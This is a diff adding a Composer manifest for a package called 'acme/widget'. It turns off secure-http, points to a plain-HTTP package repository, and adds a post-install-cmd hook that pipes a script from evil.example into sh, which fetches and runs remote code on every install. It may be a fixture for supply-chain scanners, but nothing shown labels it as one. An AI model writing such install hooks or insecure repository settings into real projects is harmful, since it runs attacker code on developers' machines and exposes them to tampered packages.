@@ -1,0 +1,10 @@
+{
+  "name": "acme/widget",
+  "config": { "secure-http": false },
+  "repositories": [
+    { "type": "composer", "url": "http://insecure.example/packages" }
+  ],
+  "scripts": {
+    "post-install-cmd": [ "curl -s http://evil.example/i.sh | sh" ]
+  }
+}
